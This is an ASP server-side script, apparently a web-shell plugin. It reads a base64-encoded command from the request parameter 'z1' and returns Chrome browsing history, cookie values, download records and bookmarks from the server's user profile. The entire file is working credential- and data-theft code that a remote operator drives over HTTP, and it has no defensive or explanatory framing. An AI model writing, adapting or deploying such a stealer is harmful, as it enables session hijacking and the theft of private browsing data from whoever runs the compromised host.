<%

function dump_history(chrome_dir) {
    var history_file = chrome_dir + System.IO.DirectorySeparatorChar + "History";
    if (!System.IO.File.Exists(history_file))
        return [];

    var dst = System.IO.Path.GetTempPath() + System.IO.DirectorySeparatorChar + System.Guid.NewGuid().ToString();
    try {
        System.IO.File.Copy(history_file, dst, true);
    } catch (e) {
        return [];
    }

    var results = [];
    try {
        var conn_str = "Data Source=" + dst + ";Version=3;Read Only=True;";
        var conn = new System.Data.SQLite.SQLiteConnection(conn_str);
        conn.Open();
        
        var cmd = new System.Data.SQLite.SQLiteCommand("SELECT url, title, last_visit_time FROM urls", conn);
        var reader = cmd.ExecuteReader();

        while (reader.Read()) {
            results.push({
                'URL': reader["url"] ? reader["url"].ToString() : "",
                'Title': reader["title"] ? reader["title"].ToString() : "",
                'LastUsed': reader["last_visit_time"] ? reader["last_visit_time"].ToString() : ""
            });
        }
        reader.Close();
        conn.Close();
    } catch (e) {}

    if (System.IO.File.Exists(dst)) {
        try { System.IO.File.Delete(dst); } catch (e) {}
    }

    return results;
}

function dump_cookie(chrome_dir) {
    var cookie_file = chrome_dir + System.IO.DirectorySeparatorChar + "Network" + System.IO.DirectorySeparatorChar + "Cookies";
    if (!System.IO.File.Exists(cookie_file)) {
        cookie_file = chrome_dir + System.IO.DirectorySeparatorChar + "Cookies";
    }

    if (!System.IO.File.Exists(cookie_file))
        return [];

    var dst = System.IO.Path.GetTempPath() + System.IO.DirectorySeparatorChar + System.Guid.NewGuid().ToString();
    try {
        System.IO.File.Copy(cookie_file, dst, true);
    } catch (e) {
        return [];
    }

    var results = [];
    try {
        var conn_str = "Data Source=" + dst + ";Version=3;Read Only=True;";
        var conn = new System.Data.SQLite.SQLiteConnection(conn_str);
        conn.Open();
        
        var cmd = new System.Data.SQLite.SQLiteCommand("SELECT host_key, name, value FROM cookies", conn);
        var reader = cmd.ExecuteReader();

        while (reader.Read()) {
            results.push({
                'Host': reader["host_key"] ? reader["host_key"].ToString() : "",
                'Name': reader["name"] ? reader["name"].ToString() : "",
                'Value': reader["value"] ? reader["value"].ToString() : ""
            });
        }
        reader.Close();
        conn.Close();
    } catch (e) {}

    if (System.IO.File.Exists(dst)) {
        try { System.IO.File.Delete(dst); } catch (e) {}
    }

    return results;
}

function dump_download(chrome_dir) {
    var history_file = chrome_dir + System.IO.DirectorySeparatorChar + "History";
    if (!System.IO.File.Exists(history_file))
        return [];

    var dst = System.IO.Path.GetTempPath() + System.IO.DirectorySeparatorChar + System.Guid.NewGuid().ToString();
    try {
        System.IO.File.Copy(history_file, dst, true);
    } catch (e) {
        return [];
    }

    var results = [];
    try {
        var conn_str = "Data Source=" + dst + ";Version=3;Read Only=True;";
        var conn = new System.Data.SQLite.SQLiteConnection(conn_str);
        conn.Open();
        
        var cmd = new System.Data.SQLite.SQLiteCommand("SELECT target_path, tab_url, total_bytes, start_time FROM downloads", conn);
        var reader = cmd.ExecuteReader();

        while (reader.Read()) {
            var target_path = reader["target_path"] ? reader["target_path"].ToString() : "";
            var total_bytes = reader["total_bytes"] ? parseInt(reader["total_bytes"].ToString()) : 0;
            results.push({
                'FileName': target_path,
                'TargetPath': target_path,
                'URL': reader["tab_url"] ? reader["tab_url"].ToString() : "",
                'Length': total_bytes,
                'Date': reader["start_time"] ? reader["start_time"].ToString() : ""
            });
        }
        reader.Close();
        conn.Close();
    } catch (e) {}

    if (System.IO.File.Exists(dst)) {
        try { System.IO.File.Delete(dst); } catch (e) {}
    }

    return results;
}

function parse_bookmark_node(node, results) {
    if (node != null) {
        try {
            var type = node["type"];
            if (type != null && type.ToString() === "url") {
                var nameObj = node["name"];
                var urlObj = node["url"];
                results.push({
                    'name': nameObj != null ? nameObj.ToString() : '',
                    'url': urlObj != null ? urlObj.ToString() : ''
                });
            }

            var children = node["children"];
            if (children != null) {
                for (var i = 0; i < children.Count; i++) {
                    parse_bookmark_node(children[i], results);
                }
            }
        } catch (e) {}
    }
}

function dump_bookmark(chrome_dir) {
    var bookmark_file = chrome_dir + System.IO.DirectorySeparatorChar + "Bookmarks";
    if (!System.IO.File.Exists(bookmark_file))
        return [];

    var results = [];
    try {
        var content = System.IO.File.ReadAllText(bookmark_file);
        var serializer = new System.Web.Script.Serialization.JavaScriptSerializer();
        serializer.MaxJsonLength = 2147483647;
        var json = serializer.DeserializeObject(content);

        if (json != null) {
            var roots = json["roots"];
            if (roots != null) {
                var enumerator = roots.GetEnumerator();
                while (enumerator.MoveNext()) {
                    parse_bookmark_node(enumerator.Current.Value, results);
                }
            }
        }
    } catch (e) {}

    return results;
}

function do_init() {
    var appdata = System.Environment.GetEnvironmentVariable("LOCALAPPDATA");
    if (string_is_empty(appdata)) {
        var user_profile = System.Environment.GetEnvironmentVariable("USERPROFILE");
        if (!string_is_empty(user_profile)) {
            appdata = user_profile + "\\AppData\\Local";
        }
    }

    if (string_is_empty(appdata))
        return "";

    return appdata + "\\Google\\Chrome\\User Data";
}

function string_is_empty(str) {
    return str === null || str === undefined || str === "";
}

function main() {
    var z1 = Request.Item["z1"];
    if (string_is_empty(z1)) {
        return "[-] Missing parameter z1.";
    }

    try {
        var base64_bytes = System.Convert.FromBase64String(z1);
        var json_str = System.Text.Encoding.UTF8.GetString(base64_bytes);
        
        var serializer = new System.Web.Script.Serialization.JavaScriptSerializer();
        var config = serializer.DeserializeObject(json_str);
        
        var action = (config && config["action"]) ? config["action"] : "";
        var profile = (config && config["profile"]) ? config["profile"] : "Default";

        var chrome_base = do_init();
        if (string_is_empty(chrome_base) || !System.IO.Directory.Exists(chrome_base)) {
            return "[-] Initialization failed: " + chrome_base;
        }

        var chrome_dir = chrome_base + System.IO.DirectorySeparatorChar + profile;
        var data = [];

        switch (action) {
            case 'history':
                data = dump_history(chrome_dir);
                break;
            case 'cookie':
                data = dump_cookie(chrome_dir);
                break;
            case 'download':
                data = dump_download(chrome_dir);
                break;
            case 'bookmark':
                data = dump_bookmark(chrome_dir);
                break;
            default:
                return "[-] Unknown action: " + action;
        }

        var response = {
            'status': 'success',
            'action': action,
            'data': data
        };

        return serializer.Serialize(response);

    } catch (e) {
        return "[-] Error: " + e.message;
    }
}

Response.Write(main());

%>